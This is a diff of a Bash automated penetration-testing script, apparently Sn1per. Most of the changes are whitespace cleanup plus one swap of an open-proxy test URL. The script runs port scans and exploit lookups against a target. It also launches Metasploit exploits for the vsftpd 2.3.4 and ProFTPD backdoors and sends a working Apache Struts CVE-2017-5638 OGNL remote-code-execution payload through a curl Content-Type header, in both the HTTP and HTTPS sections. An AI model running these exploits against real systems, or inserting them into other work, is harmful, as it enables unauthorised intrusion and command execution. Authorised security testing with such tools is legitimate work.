+    echo -e ""
+    echo -e ""
+  done;
+  exit
 fi
 
 if [ "$MODE" = "fullportonly" ]; then
-	echo -e "$OKRED    ___     ____              __            __    $RESET"
-	echo -e "$OKRED   / _/_ __/ / /__  ___  ____/ /____  ___  / /_ __$RESET"
-	echo -e "$OKRED  / _/ // / / / _ \/ _ \/ __/ __/ _ \/ _ \/ / // /$RESET"
-	echo -e "$OKRED /_/ \_,_/_/_/ .__/\___/_/  \__/\___/_//_/_/\_, / $RESET"
-	echo -e "$OKRED            /_/                            /___/  $RESET"
-	echo -e "$RESET"
-	echo -e "$OKGREEN + -- ----------------------------=[Performing Port Scan]=------------------- -- +$RESET"
-	if [ -z "$OPT1" ]; then
-		nmap -T4 -sV -O -v -p 1-65355 -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
-		echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
-		searchsploit -v --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
-	else 
-		nmap -T4 -sV -O -v -p $OPT1 -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
-		echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
-		searchsploit -v --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
-	fi
-	echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
-	exit
+  echo -e "$OKRED    ___     ____              __            __    $RESET"
+  echo -e "$OKRED   / _/_ __/ / /__  ___  ____/ /____  ___  / /_ __$RESET"
+  echo -e "$OKRED  / _/ // / / / _ \/ _ \/ __/ __/ _ \/ _ \/ / // /$RESET"
+  echo -e "$OKRED /_/ \_,_/_/_/ .__/\___/_/  \__/\___/_//_/_/\_, / $RESET"
+  echo -e "$OKRED            /_/                            /___/  $RESET"
+  echo -e "$RESET"
+  echo -e "$OKGREEN + -- ----------------------------=[Performing Port Scan]=------------------- -- +$RESET"
+  if [ -z "$OPT1" ]; then
+    nmap -T4 -sV -O -v -p 1-65355 -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
+    searchsploit -v --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
+  else
+    nmap -T4 -sV -O -v -p $OPT1 -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
+    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits]=------------------- -- +$RESET"
+    searchsploit -v --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
+  fi
+  echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
+  exit
 fi
 
 if [ "$MODE" = "port" ]; then
-	if [ -z "$OPT1" ]; then
-		echo -e "$OKRED + -- --=[Error: You need to enter a port number. $RESET"
-		exit
-	fi
+  if [ -z "$OPT1" ]; then
+    echo -e "$OKRED + -- --=[Error: You need to enter a port number. $RESET"
+    exit
+  fi
 fi
 
 if [ "$MODE" = "nuke" ]; then
-	if [ "$OPT1" = "report" ]; then
-                sniper $(realpath $TARGET) $MODE | tee $LOOT_DIR/sniper-$(basename $TARGET)-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-		exit
-	fi
-        for a in `cat $(realpath $TARGET)`; do
-		echo -e "$OKRED "
-		echo -e "$OKRED                              ____"
-		echo -e "$OKRED                      __,-~~/~    \`---."
-		echo -e "$OKRED                    _/_,---(      ,    )"
-		echo -e "$OKRED                __ /        <    /   )  \___"
-		echo -e "$OKRED - ------===;;;'====------------------===;;;===----- -  -"
-		echo -e "$OKRED                   \/  ~'~'~'~'~'~\~'~)~'/"
-		echo -e "$OKRED                   (_ (   \  (     >    \)"
-		echo -e "$OKRED                    \_( _ <         >_>'"
-		echo -e "$OKRED                       ~ \`-i' ::>|--\""
+  if [ "$OPT1" = "report" ]; then
+    sniper $(realpath $TARGET) $MODE | tee $LOOT_DIR/sniper-$(basename $TARGET)-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+    exit
+  fi
+  for a in `cat $(realpath $TARGET)`; do
+    echo -e "$OKRED "
+    echo -e "$OKRED                              ____"
+    echo -e "$OKRED                      __,-~~/~    \`---."
+    echo -e "$OKRED                    _/_,---(      ,    )"
+    echo -e "$OKRED                __ /        <    /   )  \___"
+    echo -e "$OKRED - ------===;;;'====------------------===;;;===----- -  -"
+    echo -e "$OKRED                   \/  ~'~'~'~'~'~\~'~)~'/"
+    echo -e "$OKRED                   (_ (   \  (     >    \)"
+    echo -e "$OKRED                    \_( _ <         >_>'"
+    echo -e "$OKRED                       ~ \`-i' ::>|--\""
 		echo -e "$OKRED                           I;|.|.|"
 		echo -e "$OKRED                          <|i::|i|\`."
 		echo -e "$OKRED                        (\` ^''\`-' ')"
@@ -784,10 +785,10 @@ then
 	echo -e "$OKBLUE"
 	curl -s https://crt.sh/?q=%25.$TARGET > /tmp/curl.out && cat /tmp/curl.out | grep $TARGET | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u > $LOOT_DIR/domains/domains-$TARGET-crt.txt && cat $LOOT_DIR/domains/domains-$TARGET-crt.txt
 	echo -e "$OKRED [+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
-	cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null	
-	cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null	
+	cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
+	cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
 	sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
-	rm -f /tmp/curl.out 2> /dev/null	
+	rm -f /tmp/curl.out 2> /dev/null
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Checking for Sub-Domain Hijacking]=------- -- +$RESET"
 	for a in `cat $LOOT_DIR/domains/domains-$TARGET.txt 2> /dev/null`; do dig $a CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign monitor|cargocollective|statuspage|tumblr|amazonaws|hubspot|cloudfront|modulus' 2>/dev/null; done;
@@ -868,7 +869,7 @@ if [ -z "$port_21" ];
 then
 	echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
 else
-	echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"	
+	echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
 	nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET
 	msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
 fi
@@ -907,7 +908,7 @@ else
 	echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
 	nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET
 	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
-	msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" 
+	msfconsole -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"
 fi
 
 if [ -z "$port_53" ];
@@ -915,7 +916,7 @@ then
 	echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
 else
 	echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
-	nmap -A -sU -sV -Pn -T5 --script=dns* -p U:53,T:53 $TARGET	
+	nmap -A -sU -sV -Pn -T5 --script=dns* -p U:53,T:53 $TARGET
 fi
 
 if [ -z "$port_79" ];
@@ -959,7 +960,7 @@ else
 	curl -s --insecure http://$TARGET | egrep -i meta --color=auto | tail -n 10
 	echo ""
 	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
-	curl -s --insecure -x http://$TARGET:80 -L http://crowdshield.com/.testing/openproxy.txt | tail -n 10
+	curl -s --insecure -x http://$TARGET:80 -L http://google.com | tail -n 10
 	echo ""
 	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I http://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
@@ -991,7 +992,7 @@ else
 	echo ""
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-	nikto -h http://$TARGET 
+	nikto -h http://$TARGET
 	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
 	echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
 	if [ ${DISTRO} == "blackarch"  ]; then
@@ -1032,7 +1033,7 @@ else
 		echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
 		curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET | head -n 1
 	fi
-	
+
 	if [ $SCAN_TYPE == "DOMAIN" ];
 	then
 		if [ "$GOOHAK" = "0" ]; then
@@ -1040,7 +1041,7 @@ else
 		else
 			echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
 			goohak $TARGET > /dev/null
-		fi		
+		fi
 		echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=---------- -- +$RESET"
 		php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
 		rm -Rf output/ cookie.txt exploits.conf
@@ -1128,7 +1129,7 @@ else
 	echo ""
 	echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
 	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
-	sslscan --no-failed $TARGET 
+	sslscan --no-failed $TARGET
 	testssl $TARGET
 	echo ""
   if [ $DISTRO == "blackarch" ]; then
@@ -1158,7 +1159,7 @@ else
 	curl -s --insecure https://$TARGET | egrep -i meta --color=auto | tail -n 10
 	echo ""
 	echo -e "$OKBLUE+ -- --=[Checking for open proxy on $TARGET...$RESET $OKORANGE"
-	curl -x https://$TARGET:443 -L https://crowdshield.com/.testing/openproxy.txt -s --insecure | tail -n 10
+	curl -x https://$TARGET:443 -L https://google.com -s --insecure | tail -n 10
 	echo ""
 	echo -e "$OKBLUE+ -- --=[Enumerating software on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10
@@ -1190,7 +1191,7 @@ else
 	echo ""
 	echo -e "$RESET"
 	echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-	nikto -h https://$TARGET 
+	nikto -h https://$TARGET
 	echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
@@ -1198,7 +1199,7 @@ else
     cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
   fi
   echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"
-	
+
 	if [ "$MODE" = "web" ];
 	then
 		echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
@@ -1235,7 +1236,7 @@ else
 		echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
 		curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
 	fi
-	
+
 	if [ $SCAN_TYPE == "DOMAIN" ];
 	then
 		if [ -z $GHDB ];
@@ -1245,7 +1246,7 @@ else
 			else
 				echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
 				goohak $TARGET > /dev/null
-			fi		
+			fi
 			echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=----------- -- +$RESET"
 			php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
 			rm -Rf output/ cookie.txt exploits.conf
@@ -1407,7 +1408,7 @@ else
 	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 4443
 	cd $INSTALL_DIR
-	nikto -h https://$TARGET:4443 
+	nikto -h https://$TARGET:4443
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg
   else
@@ -1478,7 +1479,7 @@ else
 	echo ""
 	xsstracer $TARGET 8000
 	cd ..
-	nikto -h http://$TARGET:8000 
+	nikto -h http://$TARGET:8000
   if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg
   else
@@ -1501,7 +1502,7 @@ else
 	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8100
 	cd $INSTALL_DIR
-	nikto -h http://$TARGET:8100 
+	nikto -h http://$TARGET:8100
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg
   else
@@ -1524,7 +1525,7 @@ else
 	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8080
 	cd $INSTALL_DIR
-	nikto -h http://$TARGET:8080 
+	nikto -h http://$TARGET:8080
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg
   else
@@ -1551,10 +1552,10 @@ else
 	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8180
 	cd $INSTALL_DIR
-	nikto -h http://$TARGET:8180 
+	nikto -h http://$TARGET:8180
   if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
-  else  
+  else
     cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
   fi
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
@@ -1579,7 +1580,7 @@ else
 	cd $PLUGINS_DIR/MassBleed
 	./massbleed $TARGET port 8443
 	cd $INSTALL_DIR
-	nikto -h https://$TARGET:8443 
+	nikto -h https://$TARGET:8443
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg
   else
@@ -1598,7 +1599,7 @@ else
 	whatweb http://$TARGET:8888
 	echo ""
 	xsstracer $TARGET 8888
-	nikto -h http://$TARGET:8888 
+	nikto -h http://$TARGET:8888
 	if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg
   else
